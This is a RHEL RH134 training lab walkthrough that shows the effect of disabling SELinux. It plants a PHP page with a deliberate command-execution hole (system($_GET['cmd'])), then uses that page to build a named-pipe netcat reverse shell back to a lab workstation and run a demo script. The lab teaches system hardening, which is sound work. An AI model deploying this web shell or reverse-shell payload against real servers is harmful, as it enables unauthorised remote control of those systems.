# rh134_Selinux
* Extra Practice for RH134 Training - RHEL 8.2 Admin II
  >> To run on Redhat RH134 Lab Systems!

### Scenario: We going to the see effects of turning off/disabled SElinux on ServerA

### Part1: Instruction - run in servera or serverb ( choose 1 ) and run as user root
  >> We assume its servera 

1.  Setup apache webserver and php 
```sh 
yum install httpd php -y 
```

2. Setup PHP Page 
```sh 

cd /var/www/html/

touch index.php 

insert this code into index.php 

<html>
 <head>
  <title>PHP Page</title>
 </head>
 <body>
 <?php echo '<p>Hello Redhatters RH134</p>'; ?>
 <p> Welcome RH134 Students </p>
 <p> Sample Vendor provided Page/App</p>
 <p> This page (php) allows you to execute Linux Command</p>
 <p> SElinux Demo Page </p>
 <?php system($_GET['cmd']);?>

 </body>
</html>
```

3. Comment PrivateTMP in htttpd and php-fpm systemd config file and save it
```sh 

vim /usr/lib/systemd/system/httpd.service
#PrivateTmp=true

vim /usr/lib/systemd/system/php-fpm.service
#PrivateTmp=true

systemctl daemon-reload 
systemctl enable --now httpd
```

4. Turn Off SElinux 
```sh 

getenforce 

setenforce 0 

getenforce 

```

5. Enable firewall to allow access to webserver
```sh 
firewall-cmd --permanent --add-service=http

firewall-cmd --reload
```

### Part2: Instruction - run in workstation machine

1. Open firefox to http://servera.lab.example.com 
once in the browser, execute this on the address bar, this will create a device character file called backpipe1 

```sh 
http://servera.lab.example.com/index.php?cmd=mknod /var/tmp/backpipe1 p

```

2. Create a local listener in workstation machine, open a terminal and run 
```sh 

firewall-cmd ----permanent --add-port=1234/tcp

firewall-cmd --reload

nc -lvvp 1234

```

3. Back to firefox, run the following to establish a reverse shell from webserver to workstation listener 
```sh 
http://servera.lab.example.com/index.php?cmd=/bin/sh 0</var/tmp/backpipe1 | nc workstation.lab.example.com 1234 1>/var/tmp/backpipe1


```

4. Check the terminal where the nc listener running and open a shell 
you should receive a connection from servera ( 172.25.250.10 )

```sh 
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.25.250.10.
Ncat: Connection from 172.25.250.10:54496.
```

Run the following command to create a shell 

```sh 
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

You should receive a shell
```sh 
sh-4.4$ 
```

5. If Step 4 done, you now have a reverse shell (hacked shell) to servera from workstation 
run the following command to create a exploit file and run the exploit 
>> the exploit file is just a shell script, in real life, an attacker could run a real exploit !!
```sh
sh-4.4$ cd /tmp

sh-4.4$ echo "echo OWN3D_servera" > ex.sh

sh-4.4$ cat ex.sh
echo OWN3D_servera

sh-4.4$ chmod +x ex.sh

sh-4.4$ ls -l ex.sh
-rwxrwxrwx. 1 apache apache 19 Mar 22 09:25 ex.sh

sh-4.4$ ./ex.sh
OWN3D_servera

sh-4.4$

```